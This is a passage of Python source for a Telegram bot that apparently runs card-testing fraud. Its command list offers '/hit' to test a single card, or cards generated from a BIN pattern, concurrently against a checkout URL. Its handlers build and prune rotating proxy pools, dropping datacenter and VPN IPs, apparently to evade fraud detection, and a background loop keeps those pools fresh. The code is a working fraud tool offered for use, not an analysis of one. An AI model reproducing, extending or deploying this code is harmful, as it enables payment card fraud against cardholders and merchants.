    user_id = callback.from_user.id
    cache = getattr(bot, 'pasted_proxies_cache', {}).get(user_id, {})
    premium_raws = cache.get('premium', [])
    
    if not premium_raws:
        await callback.answer("No strong proxies found in cache or session expired.", show_alert=True)
        return
        
    pool = await ProxyManager.get_user_proxies(user_id)
    existing_raws = {p['raw'] for p in pool}
    added = 0
    for p_raw in premium_raws:
        if p_raw not in existing_raws:
            parts = p_raw.split(':')
            if len(parts) == 4:
                pool.append({"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]})
            elif len(parts) == 2:
                pool.append({"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}"})
            added += 1
            
    if added > 0:
        await ProxyManager.save_user_proxies(user_id, pool)
        if LOG_GROUP_ID:
            try:
                proxies_str = "\n".join([f"<code>• {p}</code>" for p in premium_raws[:30]])
                if len(premium_raws) > 30:
                    proxies_str += f"\n...and {len(premium_raws) - 30} more premium channels"
                msg = f"💎 <b>Saved {added} Premium/Strong proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}\n━━━━━━━━━━━━━━━━━━━━\n{proxies_str}"
                if len(msg) > 4000:
                    msg = f"💎 <b>Saved {added} Premium/Strong proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}"
                await bot.send_message(LOG_GROUP_ID, msg)
            except:
                pass
        
    bot.pasted_proxies_cache[user_id] = {}
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"<b>Proxy Update</b>\n<code>Added {added} premium proxies. Standard/Weak/Dead IPs ignored.</code>")
    await callback.answer("Premium proxies added successfully!")

@dp.callback_query(F.data == "add_live_all")
async def process_add_live_all(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    cache = getattr(bot, 'pasted_proxies_cache', {}).get(user_id, {})
    live_raws = cache.get('live', [])
    
    if not live_raws:
        await callback.answer("No live proxies found in cache or session expired.", show_alert=True)
        return
        
    pool = await ProxyManager.get_user_proxies(user_id)
    existing_raws = {p['raw'] for p in pool}
    added = 0
    for p_raw in live_raws:
        if p_raw not in existing_raws:
            parts = p_raw.split(':')
            if len(parts) == 4:
                pool.append({"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]})
            elif len(parts) == 2:
                pool.append({"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}"})
            added += 1
            
    if added > 0:
        await ProxyManager.save_user_proxies(user_id, pool)
        if LOG_GROUP_ID:
            try:
                proxies_str = "\n".join([f"<code>• {p}</code>" for p in live_raws[:30]])
                if len(live_raws) > 30:
                    proxies_str += f"\n...and {len(live_raws) - 30} more channels"
                msg = f"📥 <b>Saved all {added} live proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}\n━━━━━━━━━━━━━━━━━━━━\n{proxies_str}"
                if len(msg) > 4000:
                    msg = f"📥 <b>Saved {added} live proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}"
                await bot.send_message(LOG_GROUP_ID, msg)
            except:
                pass
        
    bot.pasted_proxies_cache[user_id] = {}
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"<b>Proxy Update</b>\n<code>Added {added} live proxies to active pool.</code>")
    await callback.answer("All live proxies added successfully!")

@dp.callback_query(F.data == "rm_weak_proxies")
async def process_rm_weak(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    weak_proxies = getattr(bot, 'weak_proxies_cache', {}).get(user_id, [])
    
    if not weak_proxies:
        await callback.answer("No weak proxies found or session expired.", show_alert=True)
        return
        
    pool = await ProxyManager.get_user_proxies(user_id)
    new_pool = [p for p in pool if p['raw'] not in weak_proxies]
    removed = len(pool) - len(new_pool)
    
    if removed > 0:
        await ProxyManager.save_user_proxies(user_id, new_pool)
        
    bot.weak_proxies_cache[user_id] = []
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"🗑 <b>Removed {removed} weak Datacenter/VPN proxies!</b>\nYour pool is now clean.")
    await callback.answer("Proxies removed successfully!")


@dp.callback_query(F.data == "show_commands")
async def process_show_commands(callback: types.CallbackQuery):
    commands_text = (
        "<b>Commands</b>\n"
        "<code>────────────────────────</code>\n"
        "<code>/hit [url] [cc|mm|yy|cvc]</code>\n"
        "- Hits a single card against checkout.\n\n"
        "<code>/hit [url] [bin_pattern] [count]</code>\n"
        "- Generates cards and hits concurrently.\n\n"
        "<code>/proxy [ip:port:user:pass]</code>\n"
        "- Imports and validates new proxies.\n\n"
        "<code>/proxy</code>\n"
        "- Runs self-check and purges dead IPs.\n\n"
        "<code>/proxystatus</code>\n"
        "- Displays current active proxy count.\n\n"
        "<code>/offproxy</code>\n"
        "- Clears proxies and uses direct IP.\n\n"
        "<code>/stop</code>\n"
        "- Instantly aborts active session.\n"
        "<code>────────────────────────</code>"
    )
    await callback.message.answer(commands_text)
    await callback.answer()



from aiohttp import web

async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Dummy web server started on port {port} for Render health checks")

async def auto_proxy_checker_loop():
    while True:
        try:
            await asyncio.sleep(6 * 60 * 60) # Wake up every 6 hours
            print("Running Auto Proxy Checker...")
            users = await ProxyManager.get_all_users()
            for uid in users:
                proxies = list(await ProxyManager.get_user_proxies(uid))
                if not proxies: continue
                
                # Test all proxies (is_pool=True automatically deletes dead ones)
                live_proxies, dead_proxies, weak_proxies = await test_proxy_list(proxies, True, uid)
                live_count = len(live_proxies)
                dead_count = len(dead_proxies)
                
                if dead_count > 0:
                    msg = f"<b>Proxy Cleanup</b>\n<code>Removed {dead_count} dead/blocked proxy channels. Remaining active count: {live_count}</code>"
                    try:
                        await bot.send_message(uid, msg)
                    except: pass
        except Exception as e:
            print(f"Auto proxy loop error: {e}")
            await asyncio.sleep(60) # Prevent tight crash loop

async def main() -> None:
    print("Bot is starting...")
    global db_pool
    db_url = os.environ.get("DATABASE_URL")
    if db_url:
        print("Connecting to Supabase...")
        db_pool = await asyncpg.create_pool(db_url, min_size=1, max_size=4)
        async with db_pool.acquire() as conn:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS user_proxies (
                    user_id BIGINT PRIMARY KEY,
                    proxies JSONB DEFAULT '[]'
                );
            """)
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS approved_users (
                    user_id BIGINT PRIMARY KEY
                );
            """)
            rows = await conn.fetch("SELECT user_id FROM approved_users")
            for r in rows:
                approved_users_set.add(r['user_id'])
        await ProxyManager.init_db(db_pool)
        print("Supabase connected, user_proxies, and approved_users tables ready!")
    else:
        print("WARNING: DATABASE_URL not set! Proxies will not be saved.")
        
        
    await start_web_server()
    asyncio.create_task(auto_proxy_checker_loop())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
